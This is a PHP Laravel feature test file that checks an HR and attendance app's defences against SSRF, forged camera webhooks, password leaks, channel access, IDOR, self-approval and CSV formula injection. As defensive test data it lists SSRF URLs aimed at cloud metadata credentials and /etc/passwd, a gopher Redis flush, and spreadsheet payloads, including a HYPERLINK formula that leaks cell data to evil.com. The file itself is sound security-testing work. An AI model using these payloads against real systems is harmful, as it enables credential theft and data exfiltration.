<?php

namespace Tests\Feature;

use App\Events\AccessLogReceived;
use App\Models\Device;
use App\Models\DeviceAlert;
use App\Models\Department;
use App\Models\Employee;
use App\Models\LeaveBalance;
use App\Models\LeaveRequest;
use App\Models\LeaveType;
use App\Models\Organization;
use App\Models\RegularizationRequest;
use App\Models\Role;
use App\Models\User;
use App\Services\ImageStorageService;
use App\Support\CsvSanitizer;
use Carbon\Carbon;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Support\Facades\Config;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Event;
use Illuminate\Support\Facades\Http;
use Illuminate\Support\Facades\Storage;
use Laravel\Sanctum\Sanctum;
use Tests\TestCase;

class SecurityAdversarialGateTest extends TestCase
{
    use RefreshDatabase;

    protected User $superAdmin;
    protected User $managerUser;
    protected User $employeeUser1;
    protected User $employeeUser2;
    protected Employee $employeeRecord1;
    protected Employee $employeeRecord2;
    protected Employee $managerRecord;
    protected Organization $org;
    protected LeaveType $vacationLeaveType;

    protected function setUp(): void
    {
        parent::setUp();

        $superAdminRole = Role::firstOrCreate(['slug' => 'super-admin'], [
            'name' => 'Super Administrator',
            'is_system' => true,
        ]);

        $managerRole = Role::firstOrCreate(['slug' => 'manager'], [
            'name' => 'Manager',
            'is_system' => true,
        ]);
        $managerRole->givePermission([
            'leaves.view', 'leaves.apply', 'leaves.approve', 'leaves.manage',
            'attendance.view', 'attendance.manage', 'attendance.approve',
            'selfservice.view', 'employees.view', 'employees.manage', 'employees.export',
            'reports.view', 'reports.export', 'reports.payroll',
            'devices.view', 'devices.manage',
        ]);

        $employeeRole = Role::firstOrCreate(['slug' => 'employee'], [
            'name' => 'Employee',
            'is_system' => true,
        ]);
        $employeeRole->givePermission([
            'leaves.view', 'leaves.apply',
            'attendance.view', 'selfservice.view',
        ]);

        $this->org = Organization::create([
            'name' => 'Gate Adversarial Org',
            'code' => 'GATE-ORG',
            'timezone' => 'Asia/Manila',
            'is_active' => true,
        ]);

        // 1. Super Admin
        $this->superAdmin = User::factory()->create([
            'organization_id' => $this->org->id,
            'is_active' => true,
        ]);
        $this->superAdmin->roles()->sync([$superAdminRole->id]);
        $this->superAdmin->load('roles');

        // 2. Manager
        $this->managerUser = User::factory()->create([
            'organization_id' => $this->org->id,
            'is_active' => true,
        ]);
        $this->managerUser->roles()->sync([$managerRole->id]);
        $this->managerUser->load('roles');
        $this->managerRecord = Employee::create([
            'user_id' => $this->managerUser->id,
            'organization_id' => $this->org->id,
            'employee_code' => 'MGR-001',
            'first_name' => 'Manager',
            'last_name' => 'Boss',
            'employment_status' => 'active',
        ]);

        // 3. Employee 1
        $this->employeeUser1 = User::factory()->create([
            'organization_id' => $this->org->id,
            'is_active' => true,
        ]);
        $this->employeeUser1->roles()->sync([$employeeRole->id]);
        $this->employeeUser1->load('roles');
        $this->employeeRecord1 = Employee::create([
            'user_id' => $this->employeeUser1->id,
            'organization_id' => $this->org->id,
            'employee_code' => 'EMP-001',
            'first_name' => 'Alice',
            'last_name' => 'Developer',
            'employment_status' => 'active',
        ]);

        // 4. Employee 2
        $this->employeeUser2 = User::factory()->create([
            'organization_id' => $this->org->id,
            'is_active' => true,
        ]);
        $this->employeeUser2->roles()->sync([$employeeRole->id]);
        $this->employeeUser2->load('roles');
        $this->employeeRecord2 = Employee::create([
            'user_id' => $this->employeeUser2->id,
            'organization_id' => $this->org->id,
            'employee_code' => 'EMP-002',
            'first_name' => 'Bob',
            'last_name' => 'Engineer',
            'employment_status' => 'active',
        ]);

        $this->vacationLeaveType = LeaveType::create([
            'name' => 'Vacation Leave',
            'code' => 'VL-GATE',
            'max_days_per_year' => 20,
        ]);

        LeaveBalance::create([
            'employee_id' => $this->employeeRecord1->id,
            'leave_type_id' => $this->vacationLeaveType->id,
            'year' => 2026,
            'allocated' => 20,
            'used' => 0,
            'pending' => 0,
        ]);

        LeaveBalance::create([
            'employee_id' => $this->employeeRecord2->id,
            'leave_type_id' => $this->vacationLeaveType->id,
            'year' => 2026,
            'allocated' => 20,
            'used' => 0,
            'pending' => 0,
        ]);

        LeaveBalance::create([
            'employee_id' => $this->managerRecord->id,
            'leave_type_id' => $this->vacationLeaveType->id,
            'year' => 2026,
            'allocated' => 20,
            'used' => 0,
            'pending' => 0,
        ]);

        auth()->forgetGuards();
    }

    // =========================================================================
    // FOCUS AREA 1: PROBE SSRF DEFENSES IN ImageStorageService
    // =========================================================================

    public function test_ssrf_probes_reject_loopback_addresses(): void
    {
        $service = app(ImageStorageService::class);
        Http::spy();

        $loopbackProbes = [
            'http://127.0.0.1/test.jpg',
            'http://127.0.0.1:8000/internal-status',
            'http://127.0.0.2/image.png',
            'http://127.1.2.3/exploit.jpg',
            'http://127.255.255.254/secret.jpg',
            'http://localhost/image.png',
            'http://localhost:9000/keys.json',
            'http://localhost.localdomain/photo.jpg',
        ];

        foreach ($loopbackProbes as $url) {
            $this->assertFalse($service->isSafeUrl($url), "Failed to reject loopback SSRF: {$url}");
            $this->assertNull($service->storeFromUrlOrPath($url), "storeFromUrlOrPath must return null for: {$url}");
        }

        Http::shouldHaveReceived('get')->never();
    }

    public function test_ssrf_probes_reject_rfc1918_private_subnets(): void
    {
        $service = app(ImageStorageService::class);
        Http::spy();

        $rfc1918Probes = [
            // 10.0.0.0/8
            'http://10.0.0.1/admin.jpg',
            'http://10.10.10.10:8080/camera-stream',
            'http://10.255.255.254/firmware.bin',
            // 172.16.0.0/12
            'http://172.16.0.1/internal.jpg',
            'http://172.20.5.10/database.backup',
            'http://172.31.255.254/keys.pem',
            // 192.168.0.0/16
            'http://192.168.1.1/router-login',
            'http://192.168.0.100:8080/face.png',
            'http://192.168.254.254/config.xml',
        ];

        foreach ($rfc1918Probes as $url) {
            $this->assertFalse($service->isSafeUrl($url), "Failed to reject RFC 1918 SSRF: {$url}");
            $this->assertNull($service->storeFromUrlOrPath($url), "storeFromUrlOrPath must return null for: {$url}");
        }

        Http::shouldHaveReceived('get')->never();
    }

    public function test_ssrf_probes_reject_link_local_and_cloud_metadata(): void
    {
        $service = app(ImageStorageService::class);
        Http::spy();

        $metadataProbes = [
            'http://169.254.169.254/latest/meta-data/',
            'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
            'http://169.254.169.254/computeMetadata/v1/',
            'http://169.254.1.1/link-local.jpg',
            'http://169.254.254.254/test.png',
        ];

        foreach ($metadataProbes as $url) {
            $this->assertFalse($service->isSafeUrl($url), "Failed to reject cloud metadata SSRF: {$url}");
            $this->assertNull($service->storeFromUrlOrPath($url), "storeFromUrlOrPath must return null for: {$url}");
        }

        Http::shouldHaveReceived('get')->never();
    }

    public function test_ssrf_probes_reject_non_http_schemes(): void
    {
        $service = app(ImageStorageService::class);

        $nonHttpProbes = [
            'file:///etc/passwd',
            'file:///etc/shadow',
            'file:///var/log/syslog',
            'ftp://anonymous@evil.com/malware.png',
            'gopher://127.0.0.1:6379/_flushall',
            'phar:///tmp/malicious.phar/test.jpg',
            'php://filter/read=convert.base64-encode/resource=/etc/passwd',
            'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
            'javascript:alert(1)',
        ];

        foreach ($nonHttpProbes as $uri) {
            $this->assertFalse($service->isSafeUrl($uri), "Failed to reject non-HTTP scheme: {$uri}");
            $this->assertNull($service->storeFromUrlOrPath($uri), "storeFromUrlOrPath must reject non-HTTP scheme: {$uri}");
        }
    }

    public function test_ssrf_probes_reject_dns_edge_cases_and_unresolvable_domains(): void
    {
        $service = app(ImageStorageService::class);

        $dnsProbes = [
            'http://nonexistent-unresolvable-domain-99998888.invalid/pic.jpg',
            'http://this-host-surely-does-not-exist-xyz123.test/pic.png',
            'http:///pic.jpg',
            'http://',
            'https://',
            'not-a-valid-url-at-all',
        ];

        foreach ($dnsProbes as $url) {
            $this->assertFalse($service->isSafeUrl($url), "Failed to reject invalid/unresolvable URL: {$url}");
            $this->assertNull($service->storeFromUrlOrPath($url), "storeFromUrlOrPath must reject: {$url}");
        }
    }

    // =========================================================================
    // FOCUS AREA 2: PROBE WEBHOOK SECURITY
    // =========================================================================

    public function test_webhook_probes_reject_unknown_camera_serials(): void
    {
        // Unauthenticated request with rogue/unknown camera serial
        $verifyResponse = $this->postJson('/api/Subscribe/Verify', [
            'DeviceID' => 'ATTACKER-UNKNOWN-CAMERA-666',
            'info' => [
                'PersonID' => 9999,
                'VerifyStatus' => 1,
                'Similarity' => 99.9,
                'CreateTime' => now()->toDateTimeString(),
            ],
        ]);

        $this->assertEquals(401, $verifyResponse->status(), 'Unregistered camera serial on Verify must return 401');
        $this->assertDatabaseMissing('access_logs', ['device_id' => 'ATTACKER-UNKNOWN-CAMERA-666']);

        $snapResponse = $this->postJson('/api/Subscribe/Snap', [
            'DeviceID' => 'ATTACKER-UNKNOWN-CAMERA-666',
            'info' => [
                'SnapID' => 8888,
                'CreateTime' => now()->toDateTimeString(),
            ],
            'Pic' => base64_encode('fake-snap-image'),
        ]);

        $this->assertEquals(401, $snapResponse->status(), 'Unregistered camera serial on Snap must return 401');
        $this->assertDatabaseMissing('stranger_snaps', ['device_id' => 'ATTACKER-UNKNOWN-CAMERA-666']);
    }

    public function test_webhook_probes_reject_invalid_tokens_and_missing_credentials(): void
    {
        Config::set('services.camera.webhook_secret', 'SuperSecretCameraToken2026!');

        $device = Device::create([
            'device_id' => 'CAM-SECRET-TEST',
            'name' => 'Secret Test Camera',
            'ip_address' => '127.0.0.1',
            'is_active' => true,
        ]);

        // Probe 1: No secret header / token at all
        $resNoSecret = $this->postJson('/api/Subscribe/Verify', [
            'DeviceID' => 'CAM-SECRET-TEST',
            'info' => ['PersonID' => 1, 'VerifyStatus' => 1],
        ]);
        $this->assertEquals(401, $resNoSecret->status(), 'Missing webhook secret must return 401');

        // Probe 2: Invalid Bearer token
        $resBadBearer = $this->withHeader('Authorization', 'Bearer invalid-token-xyz')
            ->postJson('/api/Subscribe/Verify', [
                'DeviceID' => 'CAM-SECRET-TEST',
                'info' => ['PersonID' => 1, 'VerifyStatus' => 1],
            ]);
        $this->assertEquals(401, $resBadBearer->status(), 'Invalid Bearer token must return 401');

        // Probe 3: Invalid X-Camera-Secret header
        $resBadSecretHeader = $this->withHeader('X-Camera-Secret', 'wrong-camera-secret')
            ->postJson('/api/Subscribe/Snap', [
                'DeviceID' => 'CAM-SECRET-TEST',
                'info' => ['SnapID' => 1],
            ]);
        $this->assertEquals(401, $resBadSecretHeader->status(), 'Invalid X-Camera-Secret header must return 401');

        // Probe 4: Unknown device with valid secret -> must be rejected with 403 (inactive/un-enrolled)
        $resUnknownWithSecret = $this->withHeader('X-Camera-Secret', 'SuperSecretCameraToken2026!')
            ->postJson('/api/Subscribe/Verify', [
                'DeviceID' => 'NON-ENROLLED-CAMERA-404',
                'info' => ['PersonID' => 1, 'VerifyStatus' => 1],
            ]);
        $this->assertEquals(403, $resUnknownWithSecret->status(), 'Non-enrolled camera with valid secret must return 403');
    }

    public function test_webhook_probes_reject_oversized_base64_payloads_exceeding_10mb(): void
    {
        $device = Device::create([
            'device_id' => 'CAM-SIZE-PROBE',
            'name' => 'Size Probe Camera',
            'ip_address' => '127.0.0.1',
            'is_active' => true,
        ]);

        // Construct 11MB string (> 10MB limit)
        $oversizedBase64 = str_repeat('B', 11 * 1024 * 1024);

        // Probe oversized Verify snap pic
        $verifyRes = $this->postJson('/api/Subscribe/Verify', [
            'info' => [
                'DeviceID' => 'CAM-SIZE-PROBE',
                'PersonID' => 123,
                'VerifyStatus' => 1,
                'CreateTime' => now()->toDateTimeString(),
            ],
            'SnapPic' => $oversizedBase64,
        ]);
        $this->assertEquals(400, $verifyRes->status(), 'Oversized SnapPic on Verify must return 400 Bad Request');
        $this->assertDatabaseMissing('access_logs', ['device_id' => 'CAM-SIZE-PROBE']);

        // Probe oversized Snap pic
        $snapRes = $this->postJson('/api/Subscribe/Snap', [
            'info' => [
                'DeviceID' => 'CAM-SIZE-PROBE',
                'SnapID' => 456,
                'CreateTime' => now()->toDateTimeString(),
            ],
            'Pic' => $oversizedBase64,
        ]);
        $this->assertEquals(400, $snapRes->status(), 'Oversized Pic on Snap must return 400 Bad Request');
        $this->assertDatabaseMissing('stranger_snaps', ['device_id' => 'CAM-SIZE-PROBE']);
    }

    // =========================================================================
    // FOCUS AREA 3: PROBE DEVICE PASSWORDS
    // =========================================================================

    public function test_device_passwords_are_never_exposed_in_arrays_json_or_cleartext_db(): void
    {
        $plainPassword = 'CameraHardwareSecretP@ssw0rd!#2026';

        $device = Device::create([
            'device_id' => 'CAM-PASS-PROBE-01',
            'name' => 'Security Audit Camera',
            'ip_address' => '192.168.10.100',
            'port' => 1883,
            'username' => 'admin',
            'password' => $plainPassword,
            'is_active' => true,
        ]);

        // 1. Raw DB check: must NOT be stored as cleartext
        $rawDatabasePassword = DB::table('devices')->where('id', $device->id)->value('password');
        $this->assertNotEmpty($rawDatabasePassword);
        $this->assertNotEquals($plainPassword, $rawDatabasePassword, 'Database must store encrypted password, not plaintext');
        $this->assertStringNotContainsString($plainPassword, $rawDatabasePassword, 'Ciphertext must not contain plaintext password');

        // 2. Device::all()->toArray() must NEVER include 'password'
        $allDevicesArray = Device::all()->toArray();
        $this->assertNotEmpty($allDevicesArray);
        foreach ($allDevicesArray as $deviceArray) {
            $this->assertArrayNotHasKey('password', $deviceArray, 'Device::all()->toArray() leaked password!');
        }

        // 3. Device::find(...)->toJson() must NEVER include 'password'
        $jsonOutput = Device::find($device->id)->toJson();
        $this->assertStringNotContainsString('password', $jsonOutput, 'Device::find()->toJson() leaked password!');
        $decodedJson = json_decode($jsonOutput, true);
        $this->assertArrayNotHasKey('password', $decodedJson, 'Decoded JSON contains password key!');

        // 4. Controller API endpoints: GET /api/devices and GET /api/devices/{id}
        Sanctum::actingAs($this->superAdmin, ['*']);

        $indexResponse = $this->getJson('/api/devices');
        $indexResponse->assertOk();
        $indexResponse->assertJsonMissing(['password' => $plainPassword]);
        $this->assertStringNotContainsString('"password"', $indexResponse->getContent(), 'GET /api/devices leaked password attribute');

        $showResponse = $this->getJson("/api/devices/{$device->id}");
        $showResponse->assertOk();
        $showResponse->assertJsonMissing(['password' => $plainPassword]);
        $this->assertStringNotContainsString('"password"', $showResponse->getContent(), 'GET /api/devices/{id} leaked password attribute');

        // 5. Internal Eloquent accessor still works for camera service operations
        $this->assertEquals($plainPassword, $device->fresh()->password, 'Model decryption must preserve original password for internal services');
    }

    // =========================================================================
    // FOCUS AREA 4: PROBE CHANNEL AUTHORIZATION (routes/channels.php)
    // =========================================================================

    public function test_channel_authorization_denies_unauthenticated_and_unauthorized_users(): void
    {
        Config::set('broadcasting.default', 'reverb');
        Config::set('broadcasting.connections.reverb.key', 'reverb-test-key');
        Config::set('broadcasting.connections.reverb.secret', 'reverb-test-secret');
        Config::set('broadcasting.connections.reverb.app_id', 'reverb-test-app');
        require base_path('routes/channels.php');

        auth()->forgetGuards();

        $channelsToTest = [
            'private-access-logs',
            'private-device-alerts',
            'private-alerts',
            'private-stranger-snaps',
            'private-device-status',
            'private-attendance',
            'private-visitors',
            'private-personnel',
            'private-sync-tasks',
        ];

        // 1. Unauthenticated client: all must be rejected
        foreach ($channelsToTest as $channel) {
            $response = $this->postJson('/broadcasting/auth', [
                'channel_name' => $channel,
                'socket_id' => '1000.2000',
            ]);
            $this->assertContains($response->status(), [401, 403], "Unauthenticated user was not denied on {$channel}");
        }

        // 2. Standard user without devices.view, devices.manage, visitors.view, personnel.view:
        // Test channels standard employee should NOT have access to:
        $restrictedChannels = [
            'private-device-alerts',
            'private-alerts',
            'private-stranger-snaps',
            'private-device-status',
            'private-visitors',
            'private-personnel',
            'private-sync-tasks',
        ];

        $this->actingAs($this->employeeUser1);

        foreach ($restrictedChannels as $channel) {
            $response = $this->postJson('/broadcasting/auth', [
                'channel_name' => $channel,
                'socket_id' => '1000.2000',
            ]);
            $this->assertEquals(403, $response->status(), "Unauthorized employee accessed {$channel}");
        }

        // 3. User-specific private channels: User 1 cannot access User 2 notifications
        $crossUserNotification = $this->postJson('/broadcasting/auth', [
            'channel_name' => "private-notifications.{$this->employeeUser2->id}",
            'socket_id' => '1000.2000',
        ]);
        $this->assertEquals(403, $crossUserNotification->status(), 'User 1 was able to authorize User 2 notifications channel!');

        $crossUserModel = $this->postJson('/broadcasting/auth', [
            'channel_name' => "private-App.Models.User.{$this->employeeUser2->id}",
            'socket_id' => '1000.2000',
        ]);
        $this->assertEquals(403, $crossUserModel->status(), 'User 1 was able to authorize User 2 model channel!');

        // 4. Authorized user: User 1 CAN access their own notification channel
        $ownNotification = $this->postJson('/broadcasting/auth', [
            'channel_name' => "private-notifications.{$this->employeeUser1->id}",
            'socket_id' => '1000.2000',
        ]);
        $this->assertEquals(200, $ownNotification->status(), 'User 1 should be authorized on their own notifications channel');

        // 5. Super-admin CAN access management channels
        $this->actingAs($this->superAdmin);
        $adminAccess = $this->postJson('/broadcasting/auth', [
            'channel_name' => 'private-access-logs',
            'socket_id' => '1000.2000',
        ]);
        $this->assertEquals(200, $adminAccess->status(), 'Super-admin should be authorized on access-logs channel');
    }

    // =========================================================================
    // FOCUS AREA 5: PROBE IDOR & SELF-APPROVAL
    // =========================================================================

    public function test_idor_probe_blocks_submitting_leave_request_for_another_employee(): void
    {
        // Employee 1 attempts to submit leave on behalf of Employee 2
        Sanctum::actingAs($this->employeeUser1, ['*']);

        $response = $this->postJson('/api/leave-requests', [
            'employee_id' => $this->employeeRecord2->id, // Targeted victim employee
            'leave_type_id' => $this->vacationLeaveType->id,
            'start_date' => '2026-11-01',
            'end_date' => '2026-11-03',
            'reason' => 'IDOR attack attempt to burn peer leave balance',
        ]);

        $this->assertEquals(403, $response->status(), 'Cross-employee leave submission must return 403 Forbidden');
        $response->assertJson(['message' => 'You cannot submit leave requests for other employees.']);

        $this->assertDatabaseMissing('leave_requests', [
            'employee_id' => $this->employeeRecord2->id,
            'reason' => 'IDOR attack attempt to burn peer leave balance',
        ]);
    }

    public function test_idor_probe_blocks_submitting_regularization_for_another_employee(): void
    {
        // Employee 1 attempts to submit attendance regularization for Employee 2
        Sanctum::actingAs($this->employeeUser1, ['*']);

        $yesterday = Carbon::yesterday()->toDateString();

        $response = $this->postJson('/api/regularization-requests', [
            'employee_id' => $this->employeeRecord2->id, // Targeted victim employee
            'date' => $yesterday,
            'requested_in' => "{$yesterday} 08:00:00",
            'requested_out' => "{$yesterday} 17:00:00",
            'reason' => 'IDOR attack attempt to alter peer attendance punch',
        ]);

        $this->assertEquals(403, $response->status(), 'Cross-employee regularization submission must return 403 Forbidden');
        $response->assertJson(['message' => 'You cannot submit regularization requests for other employees.']);

        $this->assertDatabaseMissing('regularization_requests', [
            'employee_id' => $this->employeeRecord2->id,
            'reason' => 'IDOR attack attempt to alter peer attendance punch',
        ]);
    }

    public function test_self_approval_probe_blocks_manager_approving_own_leave_request(): void
    {
        // Manager creates a leave request for themself
        Sanctum::actingAs($this->managerUser, ['*']);

        $leaveReq = LeaveRequest::create([
            'employee_id' => $this->managerRecord->id,
            'leave_type_id' => $this->vacationLeaveType->id,
            'start_date' => '2026-12-01',
            'end_date' => '2026-12-05',
            'total_days' => 5,
            'status' => 'pending',
            'reason' => 'Manager annual holiday',
        ]);

        // Manager tries to self-approve the request (they have leaves.approve permission!)
        $response = $this->putJson("/api/leave-requests/{$leaveReq->id}/approve");

        $this->assertEquals(403, $response->status(), 'Self-approval of leave must return 403 Forbidden');
        $response->assertJson(['message' => 'Self-approval of leave requests is forbidden.']);

        // Verify request remains pending
        $this->assertEquals('pending', $leaveReq->fresh()->status, 'Leave request status must remain pending');
    }

    public function test_self_approval_probe_blocks_manager_approving_own_regularization_request(): void
    {
        // Manager creates a regularization request for themself
        Sanctum::actingAs($this->managerUser, ['*']);

        $twoDaysAgo = Carbon::now()->subDays(2)->toDateString();

        $regReq = RegularizationRequest::create([
            'employee_id' => $this->managerRecord->id,
            'date' => $twoDaysAgo,
            'requested_in' => "{$twoDaysAgo} 09:00:00",
            'requested_out' => "{$twoDaysAgo} 18:00:00",
            'reason' => 'Forgot to scan badge',
            'status' => 'pending',
        ]);

        // Manager tries to self-approve their own regularization
        $response = $this->putJson("/api/regularization-requests/{$regReq->id}/approve");

        $this->assertEquals(403, $response->status(), 'Self-approval of regularization must return 403 Forbidden');
        $response->assertJson(['message' => 'Self-approval of regularization requests is forbidden.']);

        // Verify request remains pending
        $this->assertEquals('pending', $regReq->fresh()->status, 'Regularization status must remain pending');
    }

    // =========================================================================
    // FOCUS AREA 6: PROBE CSV FORMULA INJECTION (DDE)
    // =========================================================================

    public function test_csv_sanitizer_prepends_quote_to_all_formula_trigger_characters(): void
    {
        $formulaAttackVectors = [
            '=cmd|\' /C calc\'!A0',
            '=HYPERLINK("http://evil.com?leak="&A1,"Click Me")',
            '+123456789',
            '+cmd|\'/C notepad\'!A0',
            '-5+10',
            '-2+3*[1]',
            '@SUM(A1:A10)',
            '@import',
            "\tTAB_TRIGGER",
            "\rCR_TRIGGER",
        ];

        foreach ($formulaAttackVectors as $payload) {
            $sanitized = CsvSanitizer::sanitize($payload);
            $this->assertStringStartsWith("'", $sanitized, "Payload was not neutralized with leading quote: {$payload}");
            $this->assertEquals("'" . $payload, $sanitized);
        }

        // Test safe values remain unmodified
        $safeValues = [
            'John Doe',
            'developer@company.com',
            'Active',
            123,
            45.67,
            null,
            '',
        ];

        foreach ($safeValues as $safe) {
            $this->assertEquals($safe, CsvSanitizer::sanitize($safe), 'Safe value was unexpectedly modified');
        }
    }

    public function test_csv_export_endpoint_neutralizes_formula_injection_in_live_stream(): void
    {
        Sanctum::actingAs($this->superAdmin, ['*']);

        // Create an employee with malicious formula injection fields
        $maliciousEmployee = Employee::create([
            'organization_id' => $this->org->id,
            'employee_code' => '=DDE_CALC',
            'first_name' => '+ExploitFirst',
            'last_name' => '-ExploitLast',
            'email' => 'hacker@example.com',
            'employment_status' => 'active',
        ]);

        $response = $this->get('/api/employees/export');
        $response->assertOk();

        $content = $response->streamedContent();
        $this->assertNotEmpty($content);

        // Verify that formula characters are neutralized with prepended single quote in the CSV output
        $this->assertStringContainsString("''=DDE_CALC", $content, 'Employee code formula trigger must be neutralized');
        $this->assertStringContainsString("''+ExploitFirst", $content, 'First name formula trigger must be neutralized');
        $this->assertStringContainsString("''-ExploitLast", $content, 'Last name formula trigger must be neutralized');
    }
}
